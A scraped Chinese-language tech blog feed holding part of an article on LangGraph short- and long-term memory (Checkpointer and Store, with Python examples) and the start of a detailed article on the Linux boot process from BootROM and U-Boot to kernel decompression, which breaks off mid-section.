<li><strong>短期记忆</strong>：通过 Checkpointer 实现，thread-scoped（线程作用域），用于跟踪单次会话中的多轮对话</li>
<li><strong>长期记忆</strong>：通过 Store 实现，跨会话存储，用于存储用户特定或应用级别的数据</li>
</ul>
<h2 data-id="heading-1">短期记忆（Short-term Memory）</h2>
<p>短期记忆通过 <strong>Checkpointer</strong> 实现，是 <strong>thread-scoped</strong>（线程作用域）的，用于跟踪单次会话中的多轮对话。</p>
<h3 data-id="heading-2">特点</h3>
<ul>
<li><strong>作用域</strong>：限定在单个 <code>thread_id</code> 内</li>
<li><strong>存储内容</strong>：对话历史、状态数据、中间结果等</li>
<li><strong>生命周期</strong>：与线程绑定，线程结束时记忆也随之结束</li>
<li><strong>实现方式</strong>：通过 Checkpointer 在每个步骤保存状态</li>
</ul>
<h3 data-id="heading-3">使用场景</h3>
<ul>
<li>多轮对话中保持上下文</li>
<li>在会话中记住用户之前说过的话</li>
<li>保存会话中的临时数据</li>
</ul>
<h3 data-id="heading-4">基本用法</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver
<span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, MessagesState

<span class="hljs-comment"># 创建 checkpointer</span>
checkpointer = InMemorySaver()

<span class="hljs-comment"># 编译图时启用 checkpointer</span>
graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer)

<span class="hljs-comment"># 第一次对话</span>
config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"user_123"</span>}}
graph.invoke({<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"user"</span>, <span class="hljs-string">"我叫张三"</span>)]}, config)

<span class="hljs-comment"># 第二次对话 - 可以访问之前的消息</span>
graph.invoke({<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"user"</span>, <span class="hljs-string">"我刚才说我叫什么？"</span>)]}, config)
<span class="hljs-comment"># Agent 可以回答："你刚才说你叫张三"</span>
</code></pre>
<h3 data-id="heading-5">短期记忆的工作原理</h3>
<ol>
<li><strong>状态保存</strong>：在每个执行步骤（superstep），Checkpointer 自动保存图的状态快照</li>
<li><strong>状态恢复</strong>：下次执行时，从保存的检查点读取状态，包括之前的对话历史</li>
<li><strong>线程隔离</strong>：不同的 <code>thread_id</code> 拥有独立的状态，互不干扰</li>
</ol>
<h3 data-id="heading-6">短期记忆的生产环境使用</h3>
<p>在生产环境中，应该使用数据库支持的 Checkpointer：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.postgres <span class="hljs-keyword">import</span> PostgresSaver

DB_URI = <span class="hljs-string">"postgresql://user:password@localhost:5432/dbname"</span>
checkpointer = PostgresSaver.from_conn_string(DB_URI)

graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer)
</code></pre>
<h2 data-id="heading-7">长期记忆（Long-term Memory）</h2>
<p>长期记忆通过 <strong>Store</strong> 实现，是 <strong>跨会话</strong> 的，用于存储用户特定或应用级别的数据。</p>
<h3 data-id="heading-8">长期记忆的特点</h3>
<ul>
<li><strong>作用域</strong>：跨多个 <code>thread_id</code>，可以在任何线程中访问</li>
<li><strong>存储内容</strong>：用户偏好、历史信息、知识库等</li>
<li><strong>生命周期</strong>：独立于线程，持久化存储</li>
<li><strong>实现方式</strong>：通过 Store 在自定义 namespace 下存储</li>
</ul>
<h3 data-id="heading-9">长期记忆的使用场景</h3>
<ul>
<li>记住用户的偏好设置</li>
<li>存储跨会话的历史信息</li>
<li>保存应用级别的知识库</li>
</ul>
<h3 data-id="heading-10">长期记忆的基本用法</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore

store = InMemoryStore()

<span class="hljs-comment"># 保存用户偏好（跨会话）</span>
<span class="hljs-keyword">await</span> store.aput(
    [<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>],
    {<span class="hljs-string">"theme"</span>: <span class="hljs-string">"dark"</span>, <span class="hljs-string">"language"</span>: <span class="hljs-string">"zh-CN"</span>}
)

<span class="hljs-comment"># 在任何线程中都可以访问</span>
preferences = <span class="hljs-keyword">await</span> store.aget([<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>])
<span class="hljs-built_in">print</span>(preferences)  <span class="hljs-comment"># {"theme": "dark", "language": "zh-CN"}</span>
</code></pre>
<h3 data-id="heading-11">命名空间结构</h3>
<p>Store 使用层次化的命名空间结构来组织数据：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 用户数据</span>
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"preferences"</span>]
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"history"</span>]
[<span class="hljs-string">"users"</span>, <span class="hljs-string">"user_123"</span>, <span class="hljs-string">"settings"</span>]

<span class="hljs-comment"># 应用数据</span>
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"config"</span>, <span class="hljs-string">"version"</span>]
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"knowledge"</span>, <span class="hljs-string">"faq"</span>]

<span class="hljs-comment"># 组织数据</span>
[<span class="hljs-string">"orgs"</span>, <span class="hljs-string">"org_456"</span>, <span class="hljs-string">"members"</span>]
</code></pre>
<h3 data-id="heading-12">长期记忆的生产环境使用</h3>
<p>在生产环境中，应该使用数据库支持的 Store：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.store.postgres <span class="hljs-keyword">import</span> PostgresStore

DB_URI = <span class="hljs-string">"postgresql://user:password@localhost:5432/dbname"</span>
store = PostgresStore.from_conn_string(DB_URI)
</code></pre>
<h2 data-id="heading-13">短期记忆 vs 长期记忆</h2>








































<table><thead><tr><th>特性</th><th>短期记忆</th><th>长期记忆</th></tr></thead><tbody><tr><td><strong>实现</strong></td><td>Checkpointer</td><td>Store</td></tr><tr><td><strong>作用域</strong></td><td>单个 <code>thread_id</code></td><td>跨多个 <code>thread_id</code></td></tr><tr><td><strong>存储内容</strong></td><td>对话历史、状态数据</td><td>用户偏好、历史信息</td></tr><tr><td><strong>生命周期</strong></td><td>与线程绑定</td><td>持久化存储</td></tr><tr><td><strong>使用场景</strong></td><td>多轮对话上下文</td><td>跨会话信息</td></tr><tr><td><strong>命名空间</strong></td><td><code>thread_id</code></td><td>自定义 namespace</td></tr></tbody></table>
<h2 data-id="heading-14">结合使用</h2>
<p>在实际应用中，可以同时使用短期记忆和长期记忆：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver
<span class="hljs-keyword">from</span> langgraph.store.memory <span class="hljs-keyword">import</span> InMemoryStore

checkpointer = InMemorySaver()  <span class="hljs-comment"># 短期记忆</span>
store = InMemoryStore()  <span class="hljs-comment"># 长期记忆</span>

graph = builder.<span class="hljs-built_in">compile</span>(checkpointer=checkpointer, store=store)

<span class="hljs-comment"># 在节点中使用</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">my_node</span>(<span class="hljs-params">state</span>):
    <span class="hljs-comment"># 访问短期记忆（当前会话的对话历史）</span>
    messages = state[<span class="hljs-string">"messages"</span>]
    
    <span class="hljs-comment"># 访问长期记忆（用户偏好）</span>
    preferences = <span class="hljs-keyword">await</span> store.aget([<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"preferences"</span>])
    
    <span class="hljs-comment"># 根据短期和长期记忆做出决策</span>
    <span class="hljs-keyword">if</span> preferences.get(<span class="hljs-string">"theme"</span>) == <span class="hljs-string">"dark"</span>:
        <span class="hljs-comment"># 使用深色主题</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"messages"</span>: [(<span class="hljs-string">"assistant"</span>, <span class="hljs-string">"回复"</span>)]}
</code></pre>
<h2 data-id="heading-15">最佳实践</h2>
<h3 data-id="heading-16">1. 选择合适的记忆类型</h3>
<ul>
<li><strong>使用短期记忆</strong>：当信息只在当前会话中有用时</li>
<li><strong>使用长期记忆</strong>：当信息需要在多个会话间共享时</li>
</ul>
<h3 data-id="heading-17">2. 管理对话历史</h3>
<p>对于长对话，考虑使用以下策略：</p>
<ul>
<li><strong>截断历史</strong>：只保留最近的 N 条消息</li>
<li><strong>摘要历史</strong>：将旧消息总结为摘要</li>
<li><strong>选择性保留</strong>：只保留重要的消息</li>
</ul>
<h3 data-id="heading-18">3. 命名空间设计</h3>
<p>设计清晰的命名空间结构：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 好的设计</span>
[<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"preferences"</span>]  <span class="hljs-comment"># 用户偏好</span>
[<span class="hljs-string">"users"</span>, user_id, <span class="hljs-string">"history"</span>]      <span class="hljs-comment"># 用户历史</span>
[<span class="hljs-string">"app"</span>, <span class="hljs-string">"config"</span>]                   <span class="hljs-comment"># 应用配置</span>

<span class="hljs-comment"># 避免</span>
[<span class="hljs-string">"data"</span>, <span class="hljs-string">"stuff"</span>]  <span class="hljs-comment"># 不够清晰</span>
[<span class="hljs-string">"user123"</span>]         <span class="hljs-comment"># 缺少层次结构</span>
</code></pre>
<h3 data-id="heading-19">4. 性能考虑</h3>
<ul>
<li><strong>短期记忆</strong>：Checkpointer 在每个步骤都会保存，注意性能影响</li>
<li><strong>长期记忆</strong>：Store 操作是异步的，适合批量操作</li>
<li><strong>缓存策略</strong>：对于频繁访问的数据，考虑使用缓存</li>
</ul>
<h3 data-id="heading-20">5. 数据一致性</h3>
<ul>
<li>确保短期记忆和长期记忆的数据一致性</li>
<li>在更新长期记忆时，考虑事务处理</li>
<li>定期清理过期的记忆数据</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux 系统启动流程详细解析]]></title>    <link>https://juejin.cn/post/7584007232411172870</link>    <guid>https://juejin.cn/post/7584007232411172870</guid>    <pubDate>2025-12-16T06:28:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584007232411172870" data-draft-id="7583969283791142966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux 系统启动流程详细解析"/> <meta itemprop="keywords" content="嵌入式"/> <meta itemprop="datePublished" content="2025-12-16T06:28:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux 系统启动流程详细解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:28:17.000Z" title="Tue Dec 16 2025 06:28:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读35分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 系统启动概述</h2>
<h3 data-id="heading-1">1.1 启动流程总览</h3>
<p>Linux系统启动是一个多阶段的过程，从硬件上电到用户空间应用运行，经历了以下主要阶段：</p>
<pre><code class="hljs language-scss" lang="scss">硬件上电
    ↓
Bootloader (U-Boot/BootROM)
    ↓
内核解压 (如果是压缩内核)
    ↓
内核早期汇编初始化 (head.S)
    ↓
C语言初始化 (start_kernel)
    ↓
子系统初始化 (initcalls)
    ↓
Init进程启动
    ↓
用户空间应用启动
</code></pre>
<h3 data-id="heading-2">1.2 各阶段的作用</h3>
<ol>
<li><strong>硬件上电</strong>: CPU从固定地址开始执行</li>
<li><strong>Bootloader</strong>: 初始化硬件，加载内核</li>
<li><strong>内核解压</strong>: 解压压缩的内核镜像</li>
<li><strong>汇编初始化</strong>: 设置CPU、MMU、页表等底层设施</li>
<li><strong>C语言初始化</strong>: 初始化内核各个子系统</li>
<li><strong>Init进程</strong>: 第一个用户空间进程，启动其他应用</li>
</ol>
<h3 data-id="heading-3">1.3 关键文件位置</h3>
<ul>
<li><strong>Bootloader</strong>: <code>arch/arm/boot/compressed/head.S</code> (压缩内核入口)</li>
<li><strong>内核入口</strong>: <code>arch/arm/kernel/head.S</code> (内核主入口)</li>
<li><strong>C语言入口</strong>: <code>init/main.c</code> (start_kernel函数)</li>
<li><strong>Init进程</strong>: <code>init/main.c</code> (kernel_init函数)</li>
</ul>
<hr/>
<h2 data-id="heading-4">2. 硬件上电阶段</h2>
<h3 data-id="heading-5">2.1 上电复位</h3>
<h4 data-id="heading-6">2.1.1 复位向量</h4>
<p>当系统上电或复位时，CPU会从<strong>复位向量</strong>（Reset Vector）地址开始执行代码。</p>
<p><strong>ARM架构的复位向量</strong>:</p>
<ul>
<li><strong>地址</strong>: 通常是 <code>0x00000000</code> 或 <code>0xFFFF0000</code>（取决于配置）</li>
<li><strong>内容</strong>: 一条跳转指令，跳转到Bootloader代码</li>
</ul>
<h4 data-id="heading-7">2.1.2 复位后的CPU状态</h4>
<p>复位后，CPU处于以下状态：</p>
<ol>
<li><strong>MMU关闭</strong>: 内存管理单元未启用，使用物理地址</li>
<li><strong>Cache关闭</strong>: 缓存未启用</li>
<li><strong>中断关闭</strong>: 所有中断被禁用</li>
<li><strong>特权模式</strong>: 通常处于Supervisor模式（ARM）或类似特权模式</li>
<li><strong>寄存器</strong>: 大部分寄存器未定义，需要初始化</li>
</ol>
<h4 data-id="heading-8">2.1.3 为什么需要Bootloader？</h4>
<p>CPU复位后只能执行简单的指令，无法直接：</p>
<ul>
<li>访问复杂的存储设备（如eMMC、NAND Flash）</li>
<li>解析文件系统</li>
<li>加载和验证内核镜像</li>
<li>设置复杂的硬件配置</li>
</ul>
<p>因此需要Bootloader作为中间层。</p>
<h3 data-id="heading-9">2.2 BootROM阶段</h3>
<h4 data-id="heading-10">2.2.1 什么是BootROM？</h4>
<p>BootROM是芯片内部固化的只读存储器，包含：</p>
<ul>
<li>芯片厂商提供的启动代码</li>
<li>基本的硬件初始化代码</li>
<li>从存储设备加载Bootloader的代码</li>
</ul>
<h4 data-id="heading-11">2.2.2 BootROM的工作流程</h4>
<pre><code class="hljs language-markdown" lang="markdown">上电复位
<span class="hljs-code">    ↓
执行BootROM代码
    ↓
初始化基本硬件（时钟、DDR等）
    ↓
从存储设备读取Bootloader
    ↓
验证Bootloader（可选）
    ↓
跳转到Bootloader
</span></code></pre>
<h4 data-id="heading-12">2.2.3 BootROM的存储位置</h4>
<ul>
<li><strong>位置</strong>: 芯片内部ROM，不可修改</li>
<li><strong>大小</strong>: 通常几KB到几十KB</li>
<li><strong>功能</strong>: 最小化的启动代码</li>
</ul>
<hr/>
<h2 data-id="heading-13">3. Bootloader阶段</h2>
<h3 data-id="heading-14">3.1 Bootloader概述</h3>
<h4 data-id="heading-15">3.1.1 什么是Bootloader？</h4>
<p>Bootloader是系统启动的第一个软件层，负责：</p>
<ol>
<li><strong>硬件初始化</strong>: 初始化CPU、内存、存储、串口等</li>
<li><strong>加载内核</strong>: 从存储设备读取内核镜像</li>
<li><strong>传递参数</strong>: 向内核传递设备树、命令行参数等</li>
<li><strong>启动内核</strong>: 跳转到内核入口地址</li>
</ol>
<h4 data-id="heading-16">3.1.2 常见的Bootloader</h4>
<ul>
<li><strong>U-Boot</strong>: 最常用的开源Bootloader</li>
<li><strong>GRUB</strong>: 主要用于x86架构</li>
<li><strong>RedBoot</strong>: 嵌入式系统常用</li>
<li><strong>BootROM</strong>: 芯片厂商提供的固件</li>
</ul>
<h4 data-id="heading-17">3.1.3 Bootloader的存储位置</h4>
<ul>
<li><strong>NOR Flash</strong>: 可以直接执行（XIP）</li>
<li><strong>NAND Flash</strong>: 需要加载到RAM执行</li>
<li><strong>eMMC/SD卡</strong>: 需要加载到RAM执行</li>
<li><strong>网络</strong>: 通过网络加载（PXE、TFTP等）</li>
</ul>
<h3 data-id="heading-18">3.2 U-Boot启动流程</h3>
<h4 data-id="heading-19">3.2.1 U-Boot的阶段划分</h4>
<p>U-Boot通常分为两个阶段：</p>
<p><strong>Stage 1 (SPL - Secondary Program Loader)</strong>:</p>
<ul>
<li>最小化的初始化</li>
<li>初始化DDR内存</li>
<li>加载完整的U-Boot到DDR</li>
</ul>
<p><strong>Stage 2 (Full U-Boot)</strong>:</p>
<ul>
<li>完整的硬件初始化</li>
<li>文件系统支持</li>
<li>网络支持</li>
<li>加载内核</li>
</ul>
<h4 data-id="heading-20">3.2.2 U-Boot的主要任务</h4>
<ol>
<li>
<p><strong>硬件初始化</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 初始化时钟</span>
clock_init();

<span class="hljs-comment">// 初始化DDR</span>
ddr_init();

<span class="hljs-comment">// 初始化串口（用于调试输出）</span>
uart_init();

<span class="hljs-comment">// 初始化存储设备</span>
storage_init();
</code></pre>
</li>
<li>
<p><strong>加载内核镜像</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 从存储设备读取内核</span>
load_kernel_image();

<span class="hljs-comment">// 验证内核（可选）</span>
verify_kernel();

<span class="hljs-comment">// 解压内核（如果是压缩镜像）</span>
decompress_kernel();
</code></pre>
</li>
<li>
<p><strong>准备启动参数</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 准备设备树（Device Tree）</span>
setup_fdt();

<span class="hljs-comment">// 准备命令行参数</span>
setup_cmdline();

<span class="hljs-comment">// 准备ATAGs（旧式参数传递方式）</span>
setup_atags();
</code></pre>
</li>
<li>
<p><strong>跳转到内核</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 设置CPU状态</span>
<span class="hljs-comment">// - 关闭MMU</span>
<span class="hljs-comment">// - 关闭Cache</span>
<span class="hljs-comment">// - 设置寄存器</span>

<span class="hljs-comment">// 跳转到内核入口</span>
jump_to_kernel();
</code></pre>
</li>
</ol>
<h3 data-id="heading-21">3.3 内核启动参数传递</h3>
<h4 data-id="heading-22">3.3.1 参数传递方式</h4>
<p>Linux内核支持两种参数传递方式：</p>
<p><strong>1. ATAGs (ARM Tags) - 旧式方式</strong></p>
<ul>
<li>用于ARM架构的传统方式</li>
<li>通过内存中的数据结构传递</li>
<li>逐步被设备树替代</li>
</ul>
<p><strong>2. Device Tree (设备树) - 现代方式</strong></p>
<ul>
<li>描述硬件配置的树形结构</li>
<li>更灵活，易于维护</li>
<li>现代ARM系统的主流方式</li>
</ul>
<h4 data-id="heading-23">3.3.2 ATAGs结构</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">atag_header</span> {</span>
    u32 size;      <span class="hljs-comment">// 整个tag的大小（以字为单位）</span>
    u32 tag;       <span class="hljs-comment">// tag类型</span>
};

<span class="hljs-comment">// 常见的ATAG类型</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_CORE       0x54410001  <span class="hljs-comment">// 核心tag</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_MEM        0x54410002  <span class="hljs-comment">// 内存信息</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_CMDLINE    0x54410009  <span class="hljs-comment">// 命令行参数</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ATAG_NONE       0x00000000  <span class="hljs-comment">// 结束标记</span></span>
</code></pre>
<h4 data-id="heading-24">3.3.3 Device Tree结构</h4>
<p>设备树是描述硬件配置的树形数据结构：</p>
<pre><code class="hljs language-dts" lang="dts">/dts-v1/;

/ {
    compatible = "allwinner,sunxi";
    
    memory@40000000 {
        device_type = "memory";
        reg = &lt;0x40000000 0x20000000&gt;;
    };
    
    cpus {
        cpu@0 {
            compatible = "arm,cortex-a7";
        };
    };
    
    uart0: serial@01c28000 {
        compatible = "allwinner,sunxi-uart";
        reg = &lt;0x01c28000 0x400&gt;;
    };
};
</code></pre>
<h4 data-id="heading-25">3.3.4 Bootloader传递给内核的寄存器</h4>
<p>ARM架构下，Bootloader通过寄存器传递参数：</p>
<ul>
<li><strong>r0</strong>: 通常为0</li>
<li><strong>r1</strong>: 机器类型ID（Machine Type ID）</li>
<li><strong>r2</strong>: ATAGs或设备树的物理地址</li>
</ul>
<p>这些寄存器值在内核启动时会被使用。</p>
<hr/>
<h2 data-id="heading-26">4. 内核解压阶段</h2>
<h3 data-id="heading-27">4.1 压缩内核概述</h3>
<h4 data-id="heading-28">4.1.1 为什么需要压缩？</h4>
<p>内核镜像通常很大（几MB到几十MB），压缩可以：</p>
<ul>
<li><strong>减少存储空间</strong>: 节省Flash空间</li>
<li><strong>加快加载速度</strong>: 减少从存储设备读取的时间</li>
<li><strong>节省内存</strong>: 解压前占用更少内存</li>
</ul>
<h4 data-id="heading-29">4.1.2 压缩格式</h4>
<p>Linux内核支持多种压缩格式：</p>
<ul>
<li><strong>gzip</strong>: 最常用，压缩率高</li>
<li><strong>bzip2</strong>: 压缩率更高，但解压慢</li>
<li><strong>lzma/xz</strong>: 压缩率最高，解压较慢</li>
<li><strong>lzo</strong>: 压缩率低，但解压快</li>
</ul>
<h4 data-id="heading-30">4.1.3 压缩内核的结构</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[压缩内核头部]</span>
    ↓
<span class="hljs-selector-attr">[解压代码]</span> (arch/arm/boot/compressed/head.S)
    ↓
<span class="hljs-selector-attr">[压缩的内核数据]</span>
    ↓
<span class="hljs-selector-attr">[解压后的内核大小]</span> (可选)
</code></pre>
<h3 data-id="heading-31">4.2 解压代码入口</h3>
<h4 data-id="heading-32">4.2.1 入口点位置</h4>
<p>压缩内核的入口点在 <code>arch/arm/boot/compressed/head.S</code>:</p>
<pre><code class="hljs language-assembly" lang="assembly">.section ".start", "ax"
.align
start:
    .type start,#function
    // 解压代码从这里开始
</code></pre>
<h4 data-id="heading-33">4.2.2 解压代码的主要任务</h4>
<ol>
<li>
<p><strong>保存Bootloader传递的参数</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// 保存r0, r1, r2寄存器
// r1 = 机器类型ID
// r2 = ATAGs/DTB地址
</code></pre>
</li>
<li>
<p><strong>设置栈指针</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// 需要栈来调用C函数
ldr sp, =stack_base
</code></pre>
</li>
<li>
<p><strong>检查是否需要解压</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// 检查内核是否已解压
// 如果已解压，直接跳转
</code></pre>
</li>
<li>
<p><strong>解压内核</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 调用解压函数</span>
decompress_kernel();
</code></pre>
</li>
<li>
<p><strong>跳转到解压后的内核</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">// 跳转到内核入口
b   stext  // 跳转到arch/arm/kernel/head.S
</code></pre>
</li>
</ol>
<h4 data-id="heading-34">4.2.3 解压过程详解</h4>
<p>解压代码的工作流程：</p>
<pre><code class="hljs language-scss" lang="scss">start (压缩内核入口)
    ↓
保存寄存器 (r0, r1, r2)
    ↓
设置栈指针
    ↓
检查内核是否已解压
    ├─ 已解压 → 直接跳转
    └─ 未解压 → 继续
    ↓
调用解压函数 (C代码)
    ↓
解压内核到目标地址
    ↓
验证解压结果
    ↓
跳转到内核入口 (stext)
</code></pre>
<h4 data-id="heading-35">4.2.4 解压函数实现</h4>
<p>解压函数在 <code>arch/arm/boot/compressed/decompress.c</code>:</p>
